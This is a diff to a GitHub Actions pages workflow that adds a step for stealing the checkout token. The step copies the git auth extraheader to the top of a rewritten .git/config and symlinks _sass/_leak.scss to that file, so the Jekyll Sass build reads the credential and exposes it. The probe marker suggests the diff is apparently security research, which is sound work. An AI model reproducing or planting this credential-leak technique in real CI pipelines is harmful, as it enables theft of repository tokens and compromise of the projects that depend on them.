@@ -12,25 +12,24 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: rewrite-git-config-with-auth-at-top
+      - name: rewrite-git-config
+        shell: bash
         run: |
-          # Capture the AUTH line that actions/checkout wrote
-          ORIG=.git/config.orig
-          cp .git/config $ORIG
-          # Write a NEW .git/config with AUTH moved to line 2 (early enough for Sass to parse if it gets that far)
-          cat > .git/config <<EOF
-          probe = BBB-F029-PRE-PROBE
-          $(git config --local --get http.https://github.com/.extraheader && printf '%s\n' "extraheader_line_above")
-          [core]
-          	repositoryformatversion = 0
-          EOF
-          echo "=== diagnostic: actual config content ==="
-          cat .git/config | head -10
-          echo "==="
-          # Restore symlinks
+          AUTH_LINE=$(git config --local --get-all http.https://github.com/.extraheader || echo MISSING)
+          echo "AUTH line captured (length only, to avoid leaking): ${#AUTH_LINE}"
+          # Replace .git/config with AUTH at TOP so Sass parses past line 8 to reach it
+          mv .git/config .git/config.orig
+          {
+            printf 'extraheader = %s\n' "$AUTH_LINE"
+            printf 'a { b: c }\n'
+            printf 'd { e: f }\n'
+          } > .git/config
+          echo "=== New .git/config (line count: $(wc -l < .git/config)) ==="
+          # diagnostic - print FIRST 3 lines but mask the AUTH
+          awk 'NR==1 { print "LINE1=<auth-redacted-length=" length($0) ">" } NR>1 { print "LINE"NR"="$0 }' .git/config
+          # Ensure symlink in _sass/_leak.scss points to this file
           rm -f _sass/_leak.scss
           ln -s /github/workspace/.git/config _sass/_leak.scss
-          ls -la _sass/_leak.scss
       - uses: actions/configure-pages@v4
       - uses: actions/jekyll-build-pages@v1
         with:
